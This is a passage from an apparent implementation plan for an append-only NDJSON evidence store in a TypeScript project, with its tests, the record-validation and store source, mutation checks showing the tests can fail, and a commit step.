const ids = (lines: readonly StoredLine[]): string[] => lines.map((line) => (line.type === 'evidence' ? line.record.id : ''))

test('what is appended is read back in the order it was written, apart per project and per file', async () => {
  const dir = tempDir('hd-evidence-store-')
  const store = new EvidenceStore(dir)
  await store.append('/work/repo', 'seats', [seatLine()])
  await store.append('/work/repo', 'evidence', [factLine(), factLine({ id: 'fact-2', observedAt: 3 })])
  await store.append('/work/other', 'evidence', [factLine({ id: 'fact-3' })])

  assert.deepEqual((await store.read('/work/repo', 'seats')).lines, [seatLine()])
  assert.deepEqual(ids((await store.read('/work/repo', 'evidence')).lines), ['fact-1', 'fact-2'])
  assert.deepEqual(ids((await store.read('/work/other', 'evidence')).lines), ['fact-3'])
  assert.deepEqual(await store.projects(), ['/work/other', '/work/repo'])
  // Beside the desk's other state, named for the project, and nowhere inside it.
  assert.ok(store.folderOf('/work/repo').startsWith(dir))
  assert.match(store.folderOf('/work/repo'), /\/repo-[0-9a-f]{10}$/)
})

test('appends that arrive together are all written, and none is lost or torn', async () => {
  const store = new EvidenceStore(tempDir('hd-evidence-store-'))
  await Promise.all(
    Array.from({ length: 50 }, (_, n) => store.append('/work/repo', 'evidence', [factLine({ id: `fact-${n}` })])),
  )
  const { lines, skipped } = await store.read('/work/repo', 'evidence')
  assert.equal(skipped, 0)
  assert.equal(new Set(ids(lines)).size, 50)
})

test('two stores writing one folder at once put their lines in either order, never inside each other', async () => {
  const dir = tempDir('hd-evidence-store-')
  const first = new EvidenceStore(dir)
  const second = new EvidenceStore(dir)
  const tail = 'x'.repeat(TAIL_LIMIT)
  await Promise.all(
    Array.from({ length: 100 }, (_, n) => [
      first.append('/work/repo', 'evidence', [factLine({ id: `first-${n}`, fact: check({ tail }) })]),
      second.append('/work/repo', 'evidence', [factLine({ id: `second-${n}`, fact: check({ tail }) })]),
    ]).flat(),
  )
  const { lines, skipped } = await new EvidenceStore(dir).read('/work/repo', 'evidence')
  assert.equal(skipped, 0)
  assert.equal(new Set(ids(lines)).size, 200)
})

test('a process killed while it writes leaves whole lines, and the store goes on after it', async () => {
  const dir = tempDir('hd-evidence-store-')
  const module = new URL('../src/evidence/store.js', import.meta.url).href
  const record = checkFact()
  const child = spawn(
    process.execPath,
    [
      '--input-type=module',
      '-e',
      `const { EvidenceStore } = await import(${JSON.stringify(module)})
       const store = new EvidenceStore(${JSON.stringify(dir)})
       const record = ${JSON.stringify(record)}
       for (let n = 0; ; n += 1) {
         await store.append('/work/repo', 'evidence', [{ type: 'evidence', record: { ...record, id: 'fact-' + n } }])
         if (n === 20) process.stdout.write('ready\\n')
       }`,
    ],
    { stdio: ['ignore', 'pipe', 'inherit'] },
  )
  await new Promise<void>((resolve, reject) => {
    child.stdout?.on('data', (chunk: Buffer) => {
      if (chunk.toString().includes('ready')) resolve()
    })
    child.on('exit', () => reject(new Error('the writer ended before it was killed')))
  })
  const ended = new Promise((resolve) => child.on('exit', resolve))
  child.kill('SIGKILL')
  await ended

  const store = new EvidenceStore(dir)
  const before = await store.read('/work/repo', 'evidence')
  assert.ok(before.lines.length >= 21, 'every line it answered for is there')
  assert.ok(before.skipped <= 1, 'at most the one line it was writing when it was killed')
  await store.append('/work/repo', 'evidence', [factLine({ id: 'after' })])
  const after = await store.read('/work/repo', 'evidence')
  assert.equal(ids(after.lines).at(-1), 'after')
  assert.equal(after.skipped, before.skipped)
})

test('a line a crash cut short is ended before the next is written, so it swallows nothing', async () => {
  const store = new EvidenceStore(tempDir('hd-evidence-store-'))
  await store.append('/work/repo', 'evidence', [factLine()])
  const file = join(store.folderOf('/work/repo'), 'evidence.ndjson')
  await appendFile(file, '{"v":1,"type":"evidence","record":{"id":"half')
  await store.append('/work/repo', 'evidence', [factLine({ id: 'fact-2' })])

  const { lines, skipped } = await store.read('/work/repo', 'evidence')
  assert.deepEqual(ids(lines), ['fact-1', 'fact-2'])
  assert.equal(skipped, 1, 'the torn line is counted, not hidden')
})

test('a write that fails is refused to its caller, and reported again by the next flush', async () => {
  const dir = tempDir('hd-evidence-store-')
  const store = new EvidenceStore(join(dir, 'blocked'))
  await writeFile(join(dir, 'blocked'), 'a file where the store wanted a folder')
  await assert.rejects(store.append('/work/repo', 'evidence', [factLine()]))
  await assert.rejects(store.flush(), 'the quit is told what was lost')
  await store.flush()
})

test('a record too large to be one line is refused, and a line too large is never read', async () => {
  const store = new EvidenceStore(tempDir('hd-evidence-store-'))
  const huge = factLine({ fact: check({ tail: 'x'.repeat(LINE_LIMIT) }) })
  await assert.rejects(store.append('/work/repo', 'evidence', [huge]), /a line may be at most 65536/)
  await store.append('/work/repo', 'evidence', [factLine()])
  const file = join(store.folderOf('/work/repo'), 'evidence.ndjson')
  await appendFile(file, `${JSON.stringify({ v: 1, type: 'evidence', record: { ...checkFact({ id: 'big' }), posted: null, pad: 'y'.repeat(LINE_LIMIT) } })}\n`)
  const { lines, skipped } = await store.read('/work/repo', 'evidence')
  assert.deepEqual([ids(lines), skipped], [['fact-1'], 1])
})

test('a line this build cannot read is skipped and counted, and never rewritten', async () => {
  const logged: unknown[] = []
  const store = new EvidenceStore(tempDir('hd-evidence-store-'), (message, details) => void logged.push({ message, details }))
  await store.append('/work/repo', 'evidence', [factLine()])
  const file = join(store.folderOf('/work/repo'), 'evidence.ndjson')
  const newer = '{"v":2,"type":"evidence","record":{"id":"from-later"}}\n'
  const unknownKind = `${JSON.stringify({ v: 1, type: 'evidence', record: { ...checkFact({ id: 'x' }), fact: { kind: 'vibes', at: A } } })}\n`
  await appendFile(file, newer + unknownKind)
  await store.append('/work/repo', 'evidence', [factLine({ id: 'fact-2' })])

  const { lines, skipped } = await store.read('/work/repo', 'evidence')
  assert.equal(lines.length, 2)
  assert.equal(skipped, 2)
  assert.equal(logged.length, 1)
  const text = await readFile(file, 'utf8')
  assert.ok(text.includes(newer) && text.includes(unknownKind), 'what a later build wrote is still there, as written')
})

test('the one rule reads a line where it is: its file, its project, and within its limits', () => {
  // A Seat in the facts file, a fact in the Seats file, a Seat kept under another project: no line at all.
  assert.equal(lineOf({ v: 1, ...seatLine() }, FACTS), null)
  assert.equal(lineOf({ v: 1, ...factLine() }, SEATS), null)
  assert.equal(lineOf({ v: 1, ...seatLine() }, { file: 'seats', project: '/work/other' }), null)
  assert.ok(lineOf({ v: 1, ...seatLine() }, SEATS))
  // A tail longer than a record keeps, or a list longer than its limit, is not a record this build reads.
  assert.equal(lineOf({ v: 1, ...factLine({ fact: check({ tail: 'x'.repeat(TAIL_LIMIT + 1) }) }) }, FACTS), null)
  const crowd = Array.from({ length: 65 }, () => ({ seat: { runtime: 'fake' }, label: 'Fake', runtimeName: 'Fake', state: 'passed' }))
  assert.equal(lineOf({ v: 1, type: 'seat', record: { ...opening(), passedOver: crowd } }, SEATS), null)
  // A fact bound to something that is not a full commit id is not a fact about a revision.
  assert.equal(lineOf({ v: 1, type: 'evidence', record: { ...checkFact(), fact: check({ at: 'HEAD' }) } }, FACTS), null)
})

test('a Seat record says its standing order in either generation, and always has the ceiling slot', () => {
  // Today's generation: the Agent's `permission:`, and no ceiling yet.
  assert.ok(lineOf({ v: 1, ...seatLine() }, SEATS))
  // Phase 3's: an Agent that says only `ceiling:`, and the ceiling it ran under.
  const ceilingOnly = seatLine({ standing: { kind: 'ceiling', level: 'edit' }, ceiling: { level: 'edit', hold: 'held' } })
  assert.deepEqual(lineOf({ v: 1, ...ceilingOnly }, SEATS), ceilingOnly)
  // Neither generation, a mixture, or no ceiling slot at all is no record this build reads.
  const { standing: _standing, ...unordered } = opening()
  assert.equal(lineOf({ v: 1, type: 'seat', record: { ...unordered, permission: 'read' } }, SEATS), null)
  assert.equal(lineOf({ v: 1, type: 'seat', record: { ...opening(), standing: { kind: 'ceiling', permission: 'read' } } }, SEATS), null)
  const { ceiling: _ceiling, ...withoutSlot } = opening()
  assert.equal(lineOf({ v: 1, type: 'seat', record: withoutSlot }, SEATS), null)
  assert.equal(lineOf({ v: 1, type: 'seat', record: { ...opening(), ceiling: { level: 'owner', hold: 'held' } } }, SEATS), null)
})

test('a read, a judgement and an append are one step: two merges at once never add a record twice', async () => {
  const store = new EvidenceStore(tempDir('hd-evidence-store-'))
  const onlyNew: Admit = (line, here, added) =>
    [...here, ...added].some((one) => one.type === 'evidence' && line.type === 'evidence' && one.record.id === line.record.id)
      ? 'duplicate'
      : 'add'
  const lines = [factLine({ id: 'one' }), factLine({ id: 'two' })]
  const [first, second] = await Promise.all([
    store.merge('/work/repo', 'evidence', lines, onlyNew),
    store.merge('/work/repo', 'evidence', lines, onlyNew),
  ])
  assert.deepEqual([first.added + second.added, first.duplicate + second.duplicate], [2, 2])
  assert.deepEqual(ids((await store.read('/work/repo', 'evidence')).lines), ['one', 'two'])
})

test('a Seat is closed by its first closing, and a second changes nothing', () => {
  const seats = foldSeats([
    seatLine(),
    seatLine({ id: 'seat-2' }),
    { type: 'seat-closed', closing: { seat: 'seat-1', at: 9, why: 'deleted' } },
    { type: 'seat-closed', closing: { seat: 'seat-1', at: 12, why: 'released' } },
  ])
  assert.deepEqual(
    seats.map((seat) => [seat.id, seat.closed]),
    [
      ['seat-1', { at: 9, why: 'deleted' }],
      ['seat-2', null],
    ],
  )
})

test('a folder whose name does not match the project it claims is not listed', async () => {
  const dir = tempDir('hd-evidence-store-')
  const store = new EvidenceStore(dir)
  await store.append('/work/repo', 'seats', [seatLine()])
  await writeFile(join(store.folderOf('/work/repo'), 'project.json'), JSON.stringify({ root: '/work/elsewhere' }))
  assert.deepEqual(await store.projects(), [])
  assert.equal((await readdir(dir)).length, 1)
})

test('nothing in the store can change or remove a line once it is written: it only appends', () => {
  assert.deepEqual(
    Object.getOwnPropertyNames(EvidenceStore.prototype).sort(),
    ['append', 'constructor', 'flush', 'folderOf', 'merge', 'projects', 'read'],
  )
})
```

- [ ] **Step 2: Run them to see them fail**

Run: `pnpm run build:node`
Expected: FAIL — `Cannot find module '../src/evidence/records.js'`.

- [ ] **Step 3: The one rule that reads a line**

Create `packages/server/src/evidence/records.ts`:

```ts
import { randomUUID } from 'node:crypto'

import type {
  CheckRun,
  Evidence,
  EvidenceRecord,
  Restored,
  SeatCandidate,
  SeatCeiling,
  SeatRecord,
  StandingOrder,
} from '@harnessdesk/protocol'

/**
 * What a stored line may say, and the one set of rules that reads one.
 *
 * The evidence store is append-only NDJSON, and every reader of it — the store
 * reading its own files, a backup being restored — goes through `lineOf`, with
 * where the line is being read: which of a project's two files, and whose.
 * One rule, used everywhere: a restore that admitted a line the store would
 * then skip, or the other way round, is two desks that disagree about what was
 * observed. So the rule is contextual — a Seat line read from the facts file,
 * or a Seat kept under another project than the one reading it, is no line at
 * all — and bounded: every string, list and line has a limit, so a record
 * cannot cost more to read than a record is worth.
 *
 * A line this build cannot read — damaged, too large, in the wrong file, or
 * written by a newer build in a shape it does not know — is skipped, and
 * counted by whoever read it. It is never rewritten: the store is
 * append-only, and a later build may read it.
 */

/** The only version of a line this build writes and reads. */
export const LINE_VERSION = 1

/** A project's two files: every Seat's opening and closing, and every fact. */
export type StoreFile = 'seats' | 'evidence'

/** Where a line is being read: which file, of which project. */
export interface LineWhere {
  readonly file: StoreFile
  readonly project: string
}

/** The most one written line may weigh, in bytes: one record, never a document. */
export const LINE_LIMIT = 64 * 1024

/** The most of what a check printed that a record keeps: enough to say why it failed. */
export const TAIL_LIMIT = 4_000

/** The longest command a record keeps. A flow's check step may say more than a checks file allows. */
const RUN_LIMIT = 8_192

/** Any other string a record holds — a name, a label, a path, a link. */
const TEXT_LIMIT = 4_096

/** The longest id: a UUID, with room to spare. */
const ID_LIMIT = 200

/** The most candidates one Seat may have passed over, checks one CI run may report, and revisions a review may name. */
const PASSED_OVER_LIMIT = 64
const CI_LIMIT = 500
const AGAINST_LIMIT = 64

/** The opening of a Seat: everything its record says but how it ended. */
export type SeatOpening = Omit<SeatRecord, 'closed'>

/** The one closing a Seat gets. */
export interface SeatClosing {
  readonly seat: string
  readonly at: number
  readonly why: string
}

/** One line of a store, as this build reads it. */
export type StoredLine =
  | { readonly type: 'seat'; readonly record: SeatOpening }
  | { readonly type: 'seat-closed'; readonly closing: SeatClosing }
  | { readonly type: 'evidence'; readonly record: EvidenceRecord }

/** A new record's id. */
export const mintId = (): string => randomUUID()

/** A full commit id: 40 hex characters, or 64 in a SHA-256 repository. Lower case, as git prints it. */
export const isSha = (value: unknown): value is string =>
  typeof value === 'string' && /^(?:[0-9a-f]{40}|[0-9a-f]{64})$/.test(value)

const isRecord = (value: unknown): value is Record<string, unknown> =>
  typeof value === 'object' && value !== null && !Array.isArray(value)
const isText = (value: unknown): value is string => typeof value === 'string' && value.length <= TEXT_LIMIT
const isFilled = (value: unknown): value is string => isText(value) && value.trim() !== ''
const isId = (value: unknown): value is string => isFilled(value) && value.length <= ID_LIMIT
const isListOf = (value: unknown, limit: number, read: (value: unknown) => boolean): boolean =>
  Array.isArray(value) && value.length <= limit && value.every(read)
const isInteger = (value: unknown): value is number => Number.isInteger(value)
const isCount = (value: unknown): value is number => isInteger(value) && value >= 0
const isTime = (value: unknown): value is number => Number.isFinite(value) && (value as number) >= 0
const orNull = <T>(value: unknown, read: (value: unknown) => value is T): value is T | null =>
  value === null || read(value)
const optionalNull = <T>(value: unknown, read: (value: unknown) => value is T): value is T | null | undefined =>
  value === undefined || value === null || read(value)

const LEVELS = new Set(['read', 'edit', 'publish', 'merge'])
const HOLDS = new Set(['held', 'asked'])
const PERMISSIONS = new Set(['read', 'publish', 'merge'])
const ORIGINS = new Set(['project', 'user', 'builtin'])

const isCeiling = (value: unknown): value is SeatCeiling =>
  isRecord(value) && LEVELS.has(value['level'] as string) && HOLDS.has(value['hold'] as string)

/** Either generation of a standing order, as it said itself — and nothing that is neither. */
const isStanding = (value: unknown): value is StandingOrder =>
  isRecord(value) &&
  ((value['kind'] === 'permission' && PERMISSIONS.has(value['permission'] as string)) ||
    (value['kind'] === 'ceiling' && LEVELS.has(value['level'] as string)))

const isRestored = (value: unknown): value is Restored => isRecord(value) && isTime(value['at'])

const isSeat = (value: unknown): boolean =>
  isRecord(value) &&
  isFilled(value['runtime']) &&
  optionalNull(value['model'], isText) &&
  optionalNull(value['effort'], isText) &&
  (value['thinking'] === undefined || typeof value['thinking'] === 'boolean')

/**
 * A candidate passed over, as far as a record needs to trust it: the words a
 * surface shows and the state. Its reason and fix are drawn only after a
 * surface reads them by kind, so a kind this build does not know is shown as
 * no reason rather than refused.
 */
const isCandidate = (value: unknown): value is SeatCandidate =>
  isRecord(value) && isSeat(value['seat']) && isText(value['label']) && isText(value['runtimeName']) && isText(value['state'])

/** The opening of a Seat, or null when the line does not hold one this build can read. */
export const seatOpeningOf = (value: unknown): SeatOpening | null => {
  if (!isRecord(value)) return null
  const agent = value['agent']
  const checkout = value['checkout']
  const session = value['session']
  const ok =
    isId(value['id']) &&
    (agent === null ||
      (isRecord(agent) && isId(agent['id']) && isText(agent['name']) && ORIGINS.has(agent['origin'] as string))) &&
    orNull(value['briefDigest'], isId) &&
    isSeat(value['seat']) &&
    isText(value['seatLabel']) &&
    isListOf(value['passedOver'], PASSED_OVER_LIMIT, isCandidate) &&
    // The seam with phase 3: the standing order in either generation's words,
    // and the ceiling it ran under — present on every record, null until phase 3.
    isStanding(value['standing']) &&
    'ceiling' in value &&
    orNull(value['ceiling'], isCeiling) &&
    isRecord(checkout) &&
    isFilled(checkout['cwd']) &&
    isFilled(checkout['project']) &&
    orNull(checkout['branch'], isFilled) &&
    orNull(checkout['head'], isSha) &&
    isRecord(session) &&
    isFilled(session['runtime']) &&
    isFilled(session['sessionId']) &&
    orNull(value['board'], isFilled) &&
    orNull(value['role'], isFilled) &&
    isTime(value['openedAt']) &&
    optionalNull(value['restored'], isRestored)
  return ok ? (value as unknown as SeatOpening) : null
}

export const seatClosingOf = (value: unknown): SeatClosing | null =>
  isRecord(value) && isId(value['seat']) && isTime(value['at']) && isFilled(value['why'])
    ? (value as unknown as SeatClosing)
    : null

const CHECK_STATES = new Set(['pending', 'passed', 'failed', 'skipped', 'cancelled'])
const isCheckRun = (value: unknown): value is CheckRun =>
  isRecord(value) && isText(value['name']) && CHECK_STATES.has(value['state'] as string) && orNull(value['url'], isText)

/** One fact, by kind. A kind this build does not know is not a fact it can read. */
export const factOf = (value: unknown): Evidence | null => {
  if (!isRecord(value)) return null
  const ok = (() => {
    switch (value['kind']) {
      case 'check':
        return (
          isFilled(value['name']) &&
          typeof value['run'] === 'string' &&
          value['run'].trim() !== '' &&
          value['run'].length <= RUN_LIMIT &&
          orNull(value['exit'], isInteger) &&
          typeof value['timedOut'] === 'boolean' &&
          isSha(value['at']) &&
          typeof value['dirty'] === 'boolean' &&
          typeof value['tail'] === 'string' &&
          value['tail'].length <= TAIL_LIMIT
        )
      case 'ci':
        return isListOf(value['checks'], CI_LIMIT, isCheckRun) && isSha(value['at'])
      case 'review':
        return (
          isFilled(value['verdict']) &&
          isId(value['by']) &&
          isSha(value['at']) &&
          (value['against'] === undefined || isListOf(value['against'], AGAINST_LIMIT, isSha))
        )
      case 'pr':
        return (
          isCount(value['number']) &&
          isSha(value['head']) &&
          ['open', 'merged', 'closed'].includes(value['state'] as string) &&
          orNull(value['url'], isText)
        )
      case 'diff':
        return (
          isCount(value['files']) &&
          isCount(value['added']) &&
          isCount(value['removed']) &&
          isSha(value['from']) &&
          isSha(value['to'])
        )
      case 'finding':
        return (
          isId(value['id']) && ['open', 'repaired', 'withdrawn'].includes(value['state'] as string) && isSha(value['at'])
        )
      case 'spend':
        return Number.isFinite(value['usd']) && isCount(value['turns']) && typeof value['exact'] === 'boolean'
      default:
        return false
    }
  })()
  return ok ? (value as unknown as Evidence) : null
}

export const evidenceRecordOf = (value: unknown): EvidenceRecord | null => {
  if (!isRecord(value)) return null
  const card = value['card']
  const checkout = value['checkout']
  const posted = value['posted']
  const ok =
    isId(value['id']) &&
    factOf(value['fact']) !== null &&
    (card === undefined || card === null || (isRecord(card) && isId(card['board']) && isCount(card['id']))) &&
    (checkout === undefined ||
      checkout === null ||
      (isRecord(checkout) && isFilled(checkout['cwd']) && orNull(checkout['branch'], isFilled))) &&
    optionalNull(value['seat'], isId) &&
    optionalNull(value['round'], isCount) &&
    isTime(value['observedAt']) &&
    (posted === undefined || posted === null || (isRecord(posted) && isCount(posted['pr']) && isCount(posted['comment']))) &&
    optionalNull(value['restored'], isRestored)
  return ok ? (value as unknown as EvidenceRecord) : null
}

/**
 * One stored line, parsed and checked where it is read, or null when this
 * build cannot read it there: a Seat's lines belong to the seats file, facts
 * to the evidence file, and a Seat's opening to the project its checkout
 * belongs to. The store reads with this, and so does a restore.
 */
export const lineOf = (value: unknown, where: LineWhere): StoredLine | null => {
  if (!isRecord(value) || value['v'] !== LINE_VERSION) return null
  switch (value['type']) {
    case 'seat': {
      if (where.file !== 'seats') return null
      const record = seatOpeningOf(value['record'])
      return record && record.checkout.project === where.project ? { type: 'seat', record } : null
    }
    case 'seat-closed': {
      if (where.file !== 'seats') return null
      const closing = seatClosingOf(value['closing'])
      return closing ? { type: 'seat-closed', closing } : null
    }
    case 'evidence': {
      if (where.file !== 'evidence') return null
      const record = evidenceRecordOf(value['record'])
      return record ? { type: 'evidence', record } : null
    }
    default:
      return null
  }
}

/** A line as it is written: one JSON object and a line feed. */
export const lineText = (line: StoredLine): string => `${JSON.stringify({ v: LINE_VERSION, ...line })}\n`

/** The id a stored line is known by, for a restore that must not write one twice. */
export const idOfLine = (line: StoredLine): string =>
  line.type === 'seat-closed' ? `closed:${line.closing.seat}` : line.record.id

/**
 * Every Seat, with how it ended. A second closing of the same seat changes
 * nothing: the first one is when the desk let it go.
 */
export const foldSeats = (lines: readonly StoredLine[]): SeatRecord[] => {
  const closings = new Map<string, SeatClosing>()
  for (const line of lines) {
    if (line.type === 'seat-closed' && !closings.has(line.closing.seat)) closings.set(line.closing.seat, line.closing)
  }
  const seen = new Set<string>()
  const out: SeatRecord[] = []
  for (const line of lines) {
    if (line.type !== 'seat' || seen.has(line.record.id)) continue
    seen.add(line.record.id)
    const closing = closings.get(line.record.id)
    out.push({ ...line.record, closed: closing ? { at: closing.at, why: closing.why } : null })
  }
  return out
}

/**
 * What makes two facts about one card the same question: a named check is its
 * own question, and every other kind is one question per card.
 */
export const factKey = (fact: Evidence): string => {
  switch (fact.kind) {
    case 'check':
      return `check:${fact.name}`
    case 'review':
      return `review:${fact.by}`
    case 'finding':
      return `finding:${fact.id}`
    default:
      return fact.kind
  }
}
```

- [ ] **Step 4: The store**

Create `packages/server/src/evidence/store.ts`:

```ts
import { createHash } from 'node:crypto'
import { mkdir, open, readdir, readFile, writeFile } from 'node:fs/promises'
import { basename, join } from 'node:path'

import { errnoOf, NOTHING_YET } from '../errno.js'
import { LINE_LIMIT, lineOf, lineText, type StoreFile, type StoredLine } from './records.js'

export type { StoreFile } from './records.js'

/**
 * The evidence store: what the desk observed, and every Seat it kept.
 *
 * One folder per project under `~/.harnessdesk/evidence/`, named for the
 * project and a hash of its path — never inside the project, which is somebody
 * else's repository. Two files in each, both append-only NDJSON: `seats.ndjson`
 * holds every Seat's opening and closing, `evidence.ndjson` every fact. They
 * are apart so that a launch, which needs every Seat, never reads a year of
 * facts to find them.
 *
 * Nothing here updates or deletes a line, and there is no method that could.
 *
 * **What an append promises.** Appends through one store are queued, one at a
 * time. Each line is written by one `write` of at most `LINE_LIMIT` bytes to a
 * file opened for appending, so two writers — a second store on the same
 * folder, another process — can put their lines in either order but never
 * inside each other's. A line a crash cut short is ended before the next one is
 * written, so it cannot swallow the line after it. And an append resolves only
 * after the file is synced: a Seat the desk answered with is on the disk, not in
 * a cache. A batch is written line by line, so a crash part-way leaves the
 * lines before it whole and nothing after.
 *
 * **One writer.** The host holds the only store on its state directory — the
 * desk runs one host per home — and everything that writes evidence goes
 * through it, so a read inside `merge` sees every line written before it. A
 * second store on the same folder (a test's reader, a restore's check) is safe
 * to write through, by the promise above, but only one queue orders its reads
 * against its own writes.
 *
 * A write that fails rejects its caller, and is kept to be reported again by
 * the next `flush()`: the desk's quit says what was lost rather than swallowing
 * it. A reader skips what it cannot read, and counts it (`records.ts`).
 */

/** What a read found: the lines this build can read, and how many it could not. */
export interface StoreRead {
  readonly lines: readonly StoredLine[]
  readonly skipped: number
}

/** What `merge` did with each line it was given. */
export interface MergeCount {
  readonly added: number
  readonly duplicate: number
  readonly refused: number
}

/** `merge`'s question about each incoming line: add it, pass it over as already here, or refuse it. */
export type Admit = (
  line: StoredLine,
  here: readonly StoredLine[],
  added: readonly StoredLine[],
) => 'add' | 'duplicate' | 'refused'

const FILE_OF: Readonly<Record<StoreFile, string>> = {
  seats: 'seats.ndjson',
  evidence: 'evidence.ndjson',
}

/** Where a folder says which project it belongs to: the hash in its name cannot be read backwards. */
const PROJECT_FILE = 'project.json'

export class EvidenceStore {
  readonly #dir: string
  readonly #log: (message: string, details: Readonly<Record<string, unknown>>) => void
  #queue: Promise<void> = Promise.resolve()
  /** The first write that failed since the last `flush()`. */
  #failure: unknown = null

  constructor(dir: string, log: (message: string, details: Readonly<Record<string, unknown>>) => void = () => {}) {
    this.#dir = dir
    this.#log = log
  }

  /** The folder a project's records live in: its name and the first ten hex characters of its path's hash. */
  folderOf(project: string): string {
    const hash = createHash('sha256').update(project).digest('hex').slice(0, 10)
    return join(this.#dir, `${basename(project) || 'root'}-${hash}`)
  }

  /** Appends lines to one of a project's two files, after every write queued before them. Resolves once they are synced. */
  append(project: string, file: StoreFile, lines: readonly StoredLine[]): Promise<void> {
    return this.#enqueue(() => this.#write(project, file, lines))
  }

  /**
   * Reads a file and appends to it as one queued step, so what `admit` was
   * shown is still what is there when the admitted lines go down. `admit` sees
   * every line already in the file and the ones this call admitted before, and
   * says of each incoming line whether it is added, already here, or refused.
   */
  merge(project: string, file: StoreFile, incoming: readonly StoredLine[], admit: Admit): Promise<MergeCount> {
    return this.#enqueue(async () => {
      const { lines: here } = await this.#readNow(project, file)
      const added: StoredLine[] = []
      let duplicate = 0
      let refused = 0
      for (const line of incoming) {
        const verdict = admit(line, here, added)
        if (verdict === 'add') added.push(line)
        else if (verdict === 'duplicate') duplicate += 1
        else refused += 1
      }
      await this.#write(project, file, added)
      return { added: added.length, duplicate, refused }
    })
  }

  /** Every line of one of a project's files this build can read there, in the order written. */
  async read(project: string, file: StoreFile): Promise<StoreRead> {
    await this.#queue
    return this.#readNow(project, file)
  }

  /** Every project this store holds records for, as each folder names it. */
  async projects(): Promise<string[]> {
    let names: string[]
    try {
      names = await readdir(this.#dir)
    } catch (error) {
      if (NOTHING_YET.has(errnoOf(error))) return []
      throw error
    }
    const out: string[] = []
    for (const name of names.sort()) {
      try {
        const said = JSON.parse(await readFile(join(this.#dir, name, PROJECT_FILE), 'utf8')) as { root?: unknown }
        if (typeof said.root === 'string' && said.root !== '' && this.folderOf(said.root) === join(this.#dir, name)) {
          out.push(said.root)
        }
      } catch {
        // A folder that does not say which project it is, or says one whose hash is not its name, is not read.
      }
    }
    return out
  }

  /**
   * Resolves once every write queued so far is synced — and rejects with the
   * first write that failed since the last flush, so a quit says what it lost.
   */
  async flush(): Promise<void> {
    await this.#queue
    const failure = this.#failure
    this.#failure = null
    if (failure !== null) throw failure
  }

  #enqueue<T>(step: () => Promise<T>): Promise<T> {
    const run = this.#queue.then(step)
    this.#queue = run.then(
      () => undefined,
      (error: unknown) => {
        this.#failure ??= error
      },
    )
    return run
  }

  async #write(project: string, file: StoreFile, lines: readonly StoredLine[]): Promise<void> {
    if (lines.length === 0) return
    const texts = lines.map((line) => Buffer.from(lineText(line)))
    const large = texts.find((text) => text.length > LINE_LIMIT)
    if (large) {
      throw new Error(`A record would be ${large.length} bytes and a line may be at most ${LINE_LIMIT}, so none of these was written.`)
    }
    const folder = this.folderOf(project)
    await mkdir(folder, { recursive: true, mode: 0o700 })
    await writeFile(join(folder, PROJECT_FILE), `${JSON.stringify({ root: project })}\n`, {
      flag: 'wx',
      mode: 0o600,
    }).catch((error: unknown) => {
      if (errnoOf(error) !== 'EEXIST') throw error
    })
    const handle = await open(join(folder, FILE_OF[file]), 'a+', 0o600)
    try {
      const { size } = await handle.stat()
      if (size > 0) {
        // A line a crash cut short is ended here, so it cannot swallow the next one.
        const last = Buffer.alloc(1)
        await handle.read(last, 0, 1, size - 1)
        if (last[0] !== 0x0a) await handle.write(Buffer.from('\n'))
      }
      for (const text of texts) {
        // One write per line, on a file opened for appending: never inside another writer's line.
        const { bytesWritten } = await handle.write(text)
        if (bytesWritten !== text.length) throw new Error('A record was written short; the next write ends it.')
      }
      await handle.sync()
    } finally {
      await handle.close()
    }
  }

  async #readNow(project: string, file: StoreFile): Promise<StoreRead> {
    let raw: string
    try {
      raw = await readFile(join(this.folderOf(project), FILE_OF[file]), 'utf8')
    } catch (error) {
      if (NOTHING_YET.has(errnoOf(error))) return { lines: [], skipped: 0 }
      throw error
    }
    const lines: StoredLine[] = []
    let skipped = 0
    for (const text of raw.split('\n')) {
      if (text.trim() === '') continue
      if (Buffer.byteLength(text) > LINE_LIMIT) {
        skipped += 1
        continue
      }
      let parsed: unknown
      try {
        parsed = JSON.parse(text)
      } catch {
        skipped += 1
        continue
      }
      const line = lineOf(parsed, { file, project })
      if (line) lines.push(line)
      else skipped += 1
    }
    if (skipped > 0) {
      this.#log('some evidence records could not be read and were skipped', { project, file, skipped })
    }
    return { lines, skipped }
  }
}
```

- [ ] **Step 5: Run the tests to see them pass**

Run: `pnpm run build:node && node --test --test-reporter=spec packages/server/dist/test/evidence-store.test.js`
Expected: PASS — 14 tests.

- [ ] **Step 6: Prove the tests can fail**

Each mutation is made in the source, built, and run against the file's tests; each is restored after.

1. In `#write`, change `if (last[0] !== 0x0a)` to `if (false)`: `a line a crash cut short is ended before the next is written, so it swallows nothing` fails.
2. In `merge`, replace `return this.#enqueue(async () => {` with `return (async (step: () => Promise<MergeCount>) => step())(async () => {`: `a read, a judgement and an append are one step: two merges at once never add a record twice` fails.
3. In `flush`, change `if (failure !== null) throw failure` to `void failure`: `a write that fails is refused to its caller, and reported again by the next flush` fails.
4. In `#write`, change `if (large) {` to `if (large && false) {`: `a record too large to be one line is refused, and a line too large is never read` fails.
5. In `lineOf`, delete `if (where.file !== 'seats') return null` from the `seat` case, or change `record && record.checkout.project === where.project ?` to `record ?`: `the one rule reads a line where it is: its file, its project, and within its limits` fails.
6. In `factOf`, change `value['tail'].length <= TAIL_LIMIT` to `true`: the same test fails.
7. In `seatOpeningOf`, change `isStanding(value['standing']) &&` to `true &&`, or delete `'ceiling' in value &&`: `a Seat record says its standing order in either generation, and always has the ceiling slot` fails.
8. Add a method `rewrite() {}` to `EvidenceStore`: `nothing in the store can change or remove a line once it is written` fails.

- [ ] **Step 7: Commit**

```bash
cd "$(git rev-parse --show-toplevel)"
mkdir -p /tmp/hdv && TMPDIR=/tmp/hdv pnpm verify; echo "verify exit: $?"
git add packages/server/src/evidence/records.ts packages/server/src/evidence/store.ts packages/server/test/evidence-store.test.ts
git commit -m "feat(evidence): an append-only store, one folder per project, read by one rule

Seats and facts are kept as NDJSON under the desk's own evidence folder, one
folder per project named for it and a hash of its path, never inside the
project. Nothing in the store can change or remove a line. Each line is one
write to a file opened for appending, synced before the append answers; a
line a crash cut short is ended before the next is written; a failed write is
refused to its caller and reported again by the next flush; and merge reads,
judges and appends as one queued step. One contextual, bounded rule reads a
line where it is — its file, its project, its limits — and a line it cannot
read is skipped, counted and left as it was. A Seat line says its standing
order in either generation, and always has the ceiling slot.

Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>"
```

Expected: `verify exit: 0` before the commit.

---

### Task 3: What git says about a checkout

